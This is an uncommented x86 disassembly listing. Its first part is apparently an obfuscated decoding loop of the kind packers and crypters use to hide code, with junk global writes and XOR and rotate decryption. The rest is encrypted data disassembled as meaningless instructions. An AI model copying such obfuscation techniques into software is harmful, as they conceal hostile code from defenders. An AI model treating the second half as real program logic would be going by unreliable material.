  403918:	add    eax,0x3300426f
  40391d:	into   
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xe9c4e32d,al
  403bc1:	cmp    ecx,DWORD PTR [ebp+0x7b9cf482]
  403bc7:	jnp    0x403bbd
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	rcr    DWORD PTR [edi],0xb
  403bcf:	push   ebp
  403bd0:	pop    edx
  403bd1:	das    
  403bd2:	mov    eax,DWORD PTR [esi-0x44]
  403bd5:	rcl    DWORD PTR [eax],0x53
  403bd8:	mov    BYTE PTR [edx+0x77],0xab
  403bdc:	cmp    DWORD PTR [esi-0x42b0c6e3],0x74
  403be3:	mov    dl,0xda
  403be5:	out    dx,eax
  403be6:	adc    bh,BYTE PTR [eax-0x4f]
  403be9:	pushf  
  403bea:	outs   dx,BYTE PTR ds:[esi]
  403beb:	jl     0x403c2a
  403bed:	add    DWORD PTR [esi-0x7a],edi
  403bf0:	push   esi
  403bf1:	xor    al,0xb
  403bf3:	mov    ch,0xdb
  403bf5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  403bf7:	add    DWORD PTR [edx],edx
  403bf9:	push   ebx
  403bfa:	dec    edx
  403bfb:	(bad)  
  403bfc:	lds    edi,FWORD PTR [ecx+0x6df77594]
  403c02:	mov    ah,0x15
  403c04:	nop
  403c05:	cmp    ebx,DWORD PTR [esi-0x11]
  403c08:	rol    edx,cl
  403c0a:	jbe    0x403c46
  403c0c:	mov    al,0xb
  403c0e:	fwait
  403c0f:	lock jmp 0x403c75
  403c12:	outs   dx,BYTE PTR ds:[esi]
  403c13:	push   esi
  403c14:	xchg   esp,eax
  403c15:	out    dx,eax
  403c16:	inc    edx
  403c17:	rcl    DWORD PTR [ecx],1
  403c19:	or     DWORD PTR [ebp+ebp*4+0x511d97ac],edi
  403c20:	std    
  403c21:	inc    ebp
  403c22:	push   0xffffff93
  403c24:	push   esp
  403c25:	cmp    eax,0x40d461c7
  403c2a:	xor    BYTE PTR [esp+eax*2],al
  403c2d:	ret    
  403c2e:	cwde   
  403c2f:	xor    edi,DWORD PTR [edx+0x48fc689c]
  403c35:	jae    0x403c0c
  403c37:	aad    0x1
  403c39:	mov    ds:0x21bc81e,eax
  403c3e:	dec    edi
  403c3f:	in     eax,dx
  403c40:	cmp    BYTE PTR [edx-0x6e6251db],al
  403c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c47:	add    al,0x6f
  403c49:	add    cl,BYTE PTR [ebp+0x7cec33e2]
  403c4f:	popa   
  403c50:	retf   
  403c51:	jmp    0xf5c4f475
  403c56:	pop    esp
  403c57:	sub    eax,0xfe3bec4b
  403c5c:	or     eax,0xc3d6bcbf
  403c61:	pushf  
  403c62:	imul   ebp,DWORD PTR es:[edx+0x6c3b87da],0xf4db51f4
  403c6d:	not    al
  403c6f:	outs   dx,BYTE PTR ds:[esi]
  403c70:	call   0xf1ae:0xb7f56782
  403c77:	ins    DWORD PTR es:[edi],dx
  403c78:	sar    edx,0x22
  403c7b:	lds    esp,FWORD PTR [ebx+0x5e]
  403c7e:	out    0x6a,al
  403c80:	and    BYTE PTR [edi-0x59],al
  403c83:	(bad)  
  403c84:	fild   WORD PTR [edi-0xa]
  403c87:	mov    fs,WORD PTR [ecx-0x44]
  403c8a:	xlat   BYTE PTR ds:[ebx]
  403c8b:	push   ds
  403c8c:	xor    eax,0x917b0b7e
  403c91:	or     BYTE PTR ds:0xaf7b30b4,bh
  403c97:	mov    BYTE PTR [edi-0x7e],al
  403c9a:	retf   
  403c9b:	mov    ecx,0x5f8621c8
  403ca0:	scas   al,BYTE PTR es:[edi]
  403ca1:	hlt    
  403ca2:	ret    0x9d23
  403ca5:	std    
  403ca6:	sbb    BYTE PTR ds:0x5f522d39,ah
  403cac:	shl    BYTE PTR [eax],cl
  403cae:	es cdq 
  403cb0:	and    al,0x4
  403cb2:	mov    ebp,0xbd056e56
  403cb7:	js     0x403cb8
  403cb9:	and    ebp,DWORD PTR [ebp-0x26]
  403cbc:	int    0x7c
  403cbe:	sub    DWORD PTR [esi],ebx
  403cc0:	das    
  403cc1:	and    dh,BYTE PTR [eax-0x39996c77]
  403cc7:	aam    0xa5
  403cc9:	pop    fs
  403ccb:	mov    DWORD PTR [edx+0x3e120d26],ebx
  403cd1:	jb     0x403d11
  403cd3:	or     al,0x55
  403cd5:	stos   DWORD PTR es:[edi],eax
  403cd6:	cmc    
  403cd7:	pop    esi
  403cd8:	out    dx,al
  403cd9:	(bad)  
  403cdb:	(bad)  
  403cdc:	repz mov cl,0x84
  403cdf:	push   edi
  403ce0:	pop    ss
  403ce1:	popf   
  403ce2:	sbb    ch,al
  403ce4:	pusha  
  403ce5:	cmc    
  403ce6:	sbb    al,0x47
  403ce8:	pop    ecx
  403ce9:	mov    ds:0x758eb21d,al
  403cee:	call   0xaab:0xd4ab76ac
  403cf5:	xchg   edx,eax
  403cf6:	sbb    eax,0xf017ecf9
  403cfb:	xor    al,0x92
  403cfd:	and    DWORD PTR [esi+0x2fc37c67],esi
  403d03:	les    eax,FWORD PTR [edi+0x61]
  403d06:	cmc    
  403d07:	pop    ss
  403d08:	imul   DWORD PTR [eax-0x5bda642f]
  403d0e:	call   0x9d5e812b
  403d13:	lods   eax,DWORD PTR ds:[esi]
  403d14:	lea    esi,[ebx*8-0x3d2e096e]
  403d1b:	sbb    cl,bl
  403d1d:	mov    edx,DWORD PTR [ecx+0x5]
  403d20:	inc    esp
  403d21:	fsubr  DWORD PTR [eax]
  403d23:	mov    ds:0x5fdb6211,al
  403d28:	push   0x31
  403d2a:	cwde   
  403d2b:	mov    DWORD PTR [ebp-0x7e],edx
  403d2e:	xchg   ebx,eax
  403d2f:	stc    
  403d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d31:	mov    ah,0xde
  403d33:	sbb    edx,DWORD PTR [edx]
  403d35:	fisub  WORD PTR [edx+ebp*4+0x33]
  403d39:	and    al,0x2e
  403d3b:	pop    edi
  403d3c:	stc    
  403d3d:	or     DWORD PTR ds:0xf5f11085,0x9839ad6
  403d47:	(bad)  
  403d48:	push   edi
  403d49:	and    eax,0x957a6ecd
  403d4e:	ja     0x403d47
  403d50:	xor    BYTE PTR [edx-0x1a],0x71
  403d54:	sub    BYTE PTR [ebx+0x1a],al
  403d57:	push   eax
  403d58:	popa   
  403d59:	xchg   ebp,eax
  403d5a:	enter  0xffde,0x6e
  403d5e:	in     al,0xe1
  403d60:	pop    esp
  403d61:	and    BYTE PTR [edi-0xa],dh
  403d64:	jae    0x403d60
  403d66:	xchg   edx,eax
  403d67:	out    0x84,al
  403d69:	outs   dx,BYTE PTR ds:[esi]
  403d6a:	js     0x403de9
  403d6c:	rcr    BYTE PTR [edx+0x6],cl
  403d6f:	or     edx,ebx
  403d71:	jge    0x403dd7
  403d73:	shl    bh,1
  403d75:	jmp    0x7164e175
  403d7a:	in     al,dx
  403d7b:	cmp    al,0x26
  403d7d:	in     eax,0xbb
  403d7f:	sub    eax,0x9bd85ea3
  403d84:	jmp    0x403d42
  403d86:	inc    ecx
  403d87:	jo     0x403d2a
  403d89:	popf   
  403d8a:	mov    bh,0xe0
  403d8c:	and    DWORD PTR [edx+0x320d21cb],ebp
  403d92:	shr    DWORD PTR [ebx],cl
  403d94:	add    eax,0x8f4ab4e6
  403d99:	fstp   QWORD PTR [ebx-0x49]
  403d9c:	ss imul eax,ebp,0x27259f34
  403da3:	repz shr DWORD PTR [edx-0x476b3749],0x12
  403dab:	sbb    dl,BYTE PTR [edx]
  403dad:	mov    bh,0x84
  403daf:	js     0x403d93
  403db1:	stos   DWORD PTR es:[edi],eax
  403db2:	push   ss
  403db3:	inc    ecx
  403db4:	js     0x403e07
  403db6:	call   0xfbab4657
  403dbb:	lods   eax,DWORD PTR ds:[esi]
  403dbc:	cmp    esi,DWORD PTR [ecx]
  403dbe:	icebp  
  403dbf:	jg     0x403d87
  403dc1:	xchg   edx,eax
  403dc2:	xor    DWORD PTR [edx-0x55],0x615861a4
  403dc9:	push   ebp
  403dca:	sub    DWORD PTR [eax],esp
  403dcc:	pop    ss
  403dcd:	xor    esp,esp
  403dcf:	bound  esi,QWORD PTR [ebx-0x32]
  403dd2:	push   0xffffffa5
  403dd4:	pop    edx
  403dd5:	ins    BYTE PTR es:[edi],dx
  403dd6:	sbb    eax,0x3c3acf2f
  403ddb:	mov    WORD PTR [esi-0x7b],cs
  403dde:	add    DWORD PTR [esi-0x21],0xb16cfff5
  403de5:	retf   
  403de6:	pusha  
  403de7:	push   edi
  403de8:	push   0xa918e80b
  403ded:	lea    ebp,[esi]
  403def:	aaa    
  403df0:	mov    ds:0x54557b95,eax
  403df5:	mov    al,ds:0xd750f16f
  403dfa:	sbb    DWORD PTR [ecx+0x48],esp
  403dfd:	jge    0x403dfc
  403dff:	xchg   ebp,eax
  403e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e01:	cmc    
  403e02:	cwde   
  403e03:	call   0xcf868d4b
  403e08:	xchg   esi,eax
  403e09:	or     al,0xbd
  403e0b:	cmp    eax,0x377e6383
  403e10:	adc    eax,0x3ed3304f
  403e15:	mov    ah,0xfc
  403e17:	xchg   edi,eax
  403e18:	(bad)  
  403e19:	loopne 0x403e35
  403e1b:	pop    esi
  403e1c:	inc    ebx
  403e1d:	fstp   QWORD PTR [ebx-0xd82ae41]
  403e23:	outs   dx,BYTE PTR ds:[esi]
  403e24:	fcom   QWORD PTR [edi]
  403e26:	mov    ah,0x46
  403e28:	aam    0x5c
  403e2a:	call   0x852d:0xa7de4adb
  403e31:	xadd   bl,ah
  403e34:	push   es
  403e35:	mov    esi,DWORD PTR [ebx-0x66fd3b4d]
  403e3b:	cmc    
  403e3c:	jb     0x403de7
  403e3e:	imul   esi,DWORD PTR [eax],0x4e892756
  403e44:	je     0x403e04
  403e46:	fs push eax
  403e48:	mov    bl,0x8b
  403e4a:	test   al,0xab
  403e4c:	adc    cl,BYTE PTR [edi+0x41]
  403e4f:	jnp    0x403e22
  403e51:	or     edi,DWORD PTR [ebp-0x7]
  403e54:	mov    al,0x10
  403e56:	aad    0x5b
  403e58:	shr    bl,1
  403e5a:	pop    ebx
  403e5b:	or     eax,0x4b2fc63e
  403e60:	pop    eax
  403e61:	mov    ebx,0x6d97941b
  403e66:	(bad)  [edx-0x2c]
  403e69:	(bad)  
  403e6a:	out    0x67,eax
  403e6c:	and    al,0xc
  403e6e:	push   0x48
  403e70:	jno    0x403e7f
  403e72:	jae    0x403ed7
  403e74:	inc    eax
  403e75:	out    0x34,al
  403e77:	js     0x403e5f
  403e79:	jae    0x403ee8
  403e7b:	xchg   ebp,eax
  403e7c:	ins    DWORD PTR es:[edi],dx
  403e7d:	xor    ch,BYTE PTR [esi+0x34]
  403e80:	ins    DWORD PTR es:[edi],dx
  403e81:	cs loope 0x403ecc
  403e84:	arpl   WORD PTR [eax+0x7583052d],bp
  403e8a:	repnz or eax,0x7cfe5180
  403e90:	add    esi,ebx
  403e92:	mov    eax,ds:0xc09dd9a4
  403e97:	and    esp,DWORD PTR [ecx]
  403e99:	dec    esp
  403e9a:	fs cmp eax,0xc26db584
  403ea0:	hlt    
  403ea1:	in     eax,0xcb
  403ea3:	pusha  
  403ea4:	mov    gs,WORD PTR [edx+0x72]
  403ea7:	call   0x78983a5c
  403eac:	mov    ch,0xaf
  403eae:	iret   
  403eaf:	fild   QWORD PTR ds:0x4b48d4f6
  403eb5:	rcr    BYTE PTR [ebp-0x72f6b4],cl
  403ebb:	jecxz  0x403e80
  403ebd:	ret    
  403ebe:	in     eax,dx
  403ebf:	cmp    ah,BYTE PTR [ebp-0x7d61afd7]
  403ec5:	dec    ebp
  403ec6:	ret    0xe15a
  403ec9:	out    0x17,al
  403ecb:	dec    esp
  403ecc:	inc    ebp
  403ecd:	int    0xb2
  403ecf:	jo     0x403f04
  403ed1:	xor    esp,DWORD PTR [ebp+0x5647627f]
  403ed7:	pusha  
  403ed8:	xor    DWORD PTR [ecx],edx
  403eda:	stos   DWORD PTR es:[edi],eax
  403edb:	mov    ds:0x754b28aa,eax
  403ee0:	or     edx,ebx
  403ee2:	pusha  
  403ee3:	mov    cl,BYTE PTR [esi]
  403ee5:	mov    ds:0x2c268cd4,al
  403eea:	xchg   edi,eax
  403eeb:	sahf   
  403eec:	cmp    DWORD PTR [eax+esi*1-0x79],0xc41910fe
  403ef4:	pop    edi
  403ef5:	sub    BYTE PTR [ecx+edx*1],bl
  403ef8:	aam    0x10
  403efa:	(bad)  
  403efb:	loopne 0x403f59
  403efd:	sti    
  403efe:	out    0x2d,eax
  403f00:	cmc    
  403f01:	mov    al,0xbe
  403f03:	leave  
  403f04:	jo     0x403f75
  403f06:	dec    ebx
  403f07:	stos   BYTE PTR es:[edi],al
  403f08:	sub    al,0x4d
  403f0a:	push   cs
  403f0b:	xor    BYTE PTR [edx],bh
  403f0d:	or     bl,BYTE PTR [esi+0x1b]
  403f10:	mov    al,ds:0x3c29c32a
  403f15:	xchg   esi,eax
  403f16:	mov    edi,0x133dbf1e
  403f1b:	ror    esi,cl
  403f1d:	adc    ah,bh
  403f1f:	or     bl,BYTE PTR [ecx+0x78652d4f]
  403f25:	inc    edx
  403f26:	xchg   ecx,eax
  403f27:	push   ecx
  403f28:	mov    ecx,0xdbfa6dbd
  403f2d:	add    DWORD PTR [eax-0x5d58de9],0x185e046f
  403f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f38:	imul   edx,DWORD PTR [esi+0x8],0xe785f789
  403f3f:	or     al,0xa0
  403f41:	sub    bh,BYTE PTR [esi]
  403f43:	pop    ebp
  403f44:	lods   al,BYTE PTR ds:[esi]
  403f45:	add    eax,0xa97f416a
  403f4a:	out    dx,eax
  403f4b:	scas   eax,DWORD PTR es:[edi]
  403f4c:	mov    ebx,DWORD PTR [eax+esi*2+0x78dde5a4]
  403f53:	jl     0x403f26
  403f55:	push   ebx
  403f56:	and    BYTE PTR [edi+0x4c],cl
  403f59:	push   0xd30af32b
  403f5e:	bound  eax,QWORD PTR [ebx+0x70]
  403f61:	imul   ebx,DWORD PTR [esi],0xffffffcc
  403f64:	pop    esi
  403f65:	(bad)  
  403f66:	out    0xd6,al
  403f68:	inc    edi
  403f69:	je     0x403f3c
  403f6b:	rcl    dh,cl
  403f6d:	ins    DWORD PTR es:[edi],dx
  403f6e:	xchg   ebx,eax
  403f6f:	pushf  
  403f70:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403f72:	mov    esi,0xfab0030
  403f77:	icebp  
  403f78:	out    0x5d,al
  403f7a:	hlt    
  403f7b:	(bad)  
  403f7c:	mov    esi,0x581c1c23
  403f81:	mov    ds:0xd8d8078,al
  403f86:	sbb    eax,0xb5d1e86b
  403f8b:	cmp    edx,DWORD PTR [esi-0x20335a98]
  403f91:	inc    esi
  403f92:	add    ebx,DWORD PTR [ebx-0x4d81b6ee]
  403f98:	fld    DWORD PTR [ebp+ecx*1-0x25]
  403f9c:	popa   
  403f9d:	jmp    0x800bd0f3
  403fa2:	inc    esp
  403fa4:	mov    dl,0x48
  403fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa7:	cmc    
  403fa8:	fstp   TBYTE PTR [ebx+0x3c]
  403fab:	inc    ecx
  403fac:	ss xchg edi,eax
  403fae:	pop    ebx
  403faf:	scas   eax,DWORD PTR es:[edi]
  403fb0:	inc    esi
  403fb1:	mov    esi,0x296dbf59
  403fb6:	xchg   esi,eax
  403fb7:	out    dx,al
  403fb8:	mov    cl,0x63
  403fba:	mov    eax,ds:0x959de7a1
  403fbf:	mov    ds:0xf2259bb4,eax
  403fc4:	dec    eax
  403fc5:	aas    
  403fc6:	cmp    DWORD PTR [edi],ecx
  403fc8:	dec    eax
  403fc9:	jp     0x404048
  403fcb:	xchg   ecx,eax
  403fcc:	inc    ecx
  403fcd:	mov    ecx,0x287eac50
  403fd2:	sar    dh,0xf0
  403fd5:	bound  edi,QWORD PTR [ebx]
  403fd7:	mov    ds:0x1bf4a09c,eax
  403fdc:	mov    ds:0x6777bd2c,eax
  403fe1:	stos   BYTE PTR es:[edi],al
  403fe2:	lods   al,BYTE PTR ds:[esi]
  403fe3:	pop    edi
  403fe4:	sbb    esp,eax
  403fe6:	xchg   esp,eax
  403fe7:	mov    bl,0xf2
  403fe9:	sub    dh,BYTE PTR [edi+0xb072253]
  403fef:	xor    ecx,edi
  403ff1:	cli    
  403ff2:	rol    dl,1
  403ff4:	test   BYTE PTR [edx-0x730bb63a],al
  403ffa:	add    BYTE PTR [ebx-0x577a9fbc],dh
  404000:	or     edi,DWORD PTR [ebx+0x69b357c8]
  404006:	call   0xcd8d1ab4
  40400b:	mov    ecx,edi
  40400d:	sub    esi,esp
  40400f:	pop    ecx
  404010:	in     eax,0xa3
  404012:	arpl   WORD PTR [edi+ecx*8],sp
  404015:	dec    edx
  404016:	xchg   edx,eax
  404017:	dec    esi
  404018:	scas   eax,DWORD PTR es:[edi]
  404019:	mov    al,0x90
  40401b:	js     0x404034
  40401d:	inc    edx
  40401e:	outs   dx,DWORD PTR ds:[esi]
  40401f:	mov    bh,0xc0
  404021:	test   al,0x4d
  404023:	sub    al,cl
  404025:	sbb    ah,BYTE PTR [esi]
  404027:	scas   eax,DWORD PTR es:[edi]
  404028:	out    dx,al
  404029:	xchg   BYTE PTR [eax-0x4],cl
  40402c:	xlat   BYTE PTR ds:[ebx]
  40402d:	nop
  40402e:	mov    es,edi
  404030:	or     BYTE PTR [esp+edx*4-0x11],0xf4
  404035:	pop    esp
  404036:	out    dx,al
  404037:	xchg   ebp,eax
  404038:	and    al,0x71
  40403a:	test   DWORD PTR [esi+edx*1],ebp
  40403d:	(bad)  
  40403e:	outs   dx,DWORD PTR ds:[esi]
  40403f:	add    eax,0xf4470aec
  404044:	jmp    0x4040b9
  404046:	arpl   WORD PTR [esi+0x29],di
  404049:	cld    
  40404a:	fst    DWORD PTR [eax*8-0x7652f29f]
  404051:	aad    0x47
  404053:	mov    esi,0x4296937b
  404058:	popa   
  404059:	or     DWORD PTR [eax+0x1a],eax
  40405c:	call   0x5879a93
  404061:	stos   DWORD PTR es:[edi],eax
  404062:	out    0xd7,al
  404064:	add    BYTE PTR ds:0x58526dff,dh
  40406a:	jnp    0x404011
  40406c:	daa    
  40406d:	mov    ds:0x7b59c26d,al
  404072:	mov    ch,0xd9
  404074:	cmp    bl,BYTE PTR [eax+0x1c]
  404077:	addr16 fnsetpm(287 only) 
  40407a:	int    0x9
  40407c:	(bad)  
  40407d:	xchg   ecx,eax
  40407e:	mov    DWORD PTR [esi],esi
  404080:	popf   
  404081:	add    DWORD PTR [esi+0x14a436b4],eax
  404087:	loope  0x404077
  404089:	adc    al,0x32
  40408b:	imul   eax,edi,0xf6285916
  404091:	xchg   ebx,eax
  404092:	popa   
  404093:	push   edi
  404094:	dec    edi
  404095:	retf   
  404096:	cmp    bl,dh
  404098:	sbb    DWORD PTR ds:0x4a2d1825,ebp
  40409e:	rol    BYTE PTR [esi+0x10],cl
  4040a1:	jo     0x404028
  4040a3:	into   
  4040a4:	aaa    
  4040a5:	inc    ebp
  4040a6:	mov    esp,0x51ddf26f
  4040ab:	xlat   BYTE PTR ds:[ebx]
  4040ac:	imul   ecx,DWORD PTR [ecx+0x71],0x86552ae4
  4040b3:	inc    esp
  4040b4:	mov    edx,0x1b46f7f5
  4040b9:	in     eax,0x70
  4040bb:	jae    0x404040
  4040bd:	push   0x2dce1422
  4040c2:	xlat   BYTE PTR ds:[ebx]
  4040c3:	cmp    dl,dl
  4040c5:	mov    ebp,0x24fcde91
  4040ca:	arpl   WORD PTR [eax-0x58566dfd],si
  4040d0:	dec    edi
  4040d1:	pop    edx
  4040d2:	jmp    0xb93f:0x324c1047
  4040d9:	xchg   edi,eax
  4040da:	sbb    bl,ch
  4040dc:	add    DWORD PTR [ecx+0x20795a6e],edx
  4040e2:	mov    cl,0xa2
  4040e4:	arpl   di,ax
  4040e6:	jne    0x404116
  4040e8:	cmp    ch,bh
  4040ea:	xchg   esi,eax
  4040eb:	adc    dl,BYTE PTR [ebx+eiz*4+0x63]
  4040ef:	jp     0x404167
  4040f1:	jg     0x404089
  4040f3:	fidiv  WORD PTR [edx]
  4040f5:	xor    ebp,DWORD PTR [eax+0x7246c081]
  4040fb:	or     edx,esp
  4040fd:	aad    0xf5
  4040ff:	push   ds
  404100:	pop    ds
  404101:	sub    al,0x6f
  404103:	shl    DWORD PTR [ebp+0x12a604eb],cl
  404109:	sbb    cl,ch
  40410b:	mov    edx,DWORD PTR [ecx]
  40410d:	pop    edx
  40410e:	sbb    ecx,0xffffffe4
  404111:	jp     0x4040ef
  404113:	sub    eax,0xc8c0f0d7
  404118:	es popa 
  40411a:	jp     0x4040a4
  40411c:	jl     0x40410a
  40411e:	sub    cl,BYTE PTR [edx-0x3b]
  404121:	das    
  404122:	adc    DWORD PTR [ebx+0x3e],edi
  404125:	gs shl cl,cl
  404128:	test   DWORD PTR [edi-0x55c7fdf0],esp
  40412e:	mov    esp,0xf5c8f698
  404133:	jbe    0x404121
  404135:	dec    esi
  404136:	and    DWORD PTR [edi-0x42],0x19c9b36e
  40413d:	les    edi,FWORD PTR [eax]
  40413f:	jns    0x404166
  404141:	inc    ebx
  404142:	jmp    0x404126
  404144:	lock xor edx,edx
  404147:	repnz rol BYTE PTR [ecx],cl
  40414a:	cwde   
  40414b:	xor    bh,BYTE PTR [ebp+0xd50a815]
  404151:	ror    DWORD PTR [ecx+0x4d],1
  404154:	ror    DWORD PTR [esi],0x6a
  404157:	fisttp DWORD PTR [ebp-0x8475999]
  40415d:	mov    bl,0xda
  40415f:	push   cs
  404160:	inc    esp
  404161:	fnstsw WORD PTR [esi-0x4f8ea872]
  404167:	test   DWORD PTR [edx+0x58],0xdda96fe3
  40416e:	fiadd  WORD PTR [ecx]
  404170:	sub    eax,0x8cf8e72f
  404175:	and    ch,ah
  404177:	sub    DWORD PTR [eax-0x26836c09],0x7b
  40417e:	aam    0x94
  404180:	pop    ecx
  404181:	out    dx,al
  404182:	sbb    ah,bl
  404184:	addr16 push 0xfffffffa
  404187:	(bad)  [esi+0x2219e8cd]
  40418d:	cli    
  40418e:	sub    eax,0xdf74a9a9
  404193:	aad    0x86
  404195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404196:	idiv   BYTE PTR [ecx-0x17]
  404199:	js     0x404135
  40419b:	sti    
  40419c:	push   0x31dac0ce
  4041a1:	dec    esp
  4041a2:	setb   BYTE PTR [esi]
  4041a5:	test   eax,0x518c0f5f
  4041aa:	push   esi
  4041ab:	repz xchg ecx,eax
  4041ad:	shl    BYTE PTR [ecx+0x4d],0x92
  4041b1:	mov    WORD PTR [ebx-0x65bb566d],ss
  4041b7:	pusha  
  4041b8:	mov    DWORD PTR [esi],ebx
  4041ba:	pop    ss
  4041bb:	popa   
  4041bc:	or     eax,0xb7dc0cee
  4041c1:	cmp    BYTE PTR [ebx-0x24],dl
  4041c4:	pop    ebx
  4041c5:	fsub   QWORD PTR [esi]
  4041c7:	repz int3 
  4041c9:	sub    DWORD PTR [ebp-0x31b7de36],esp
  4041cf:	fstp   st(1)
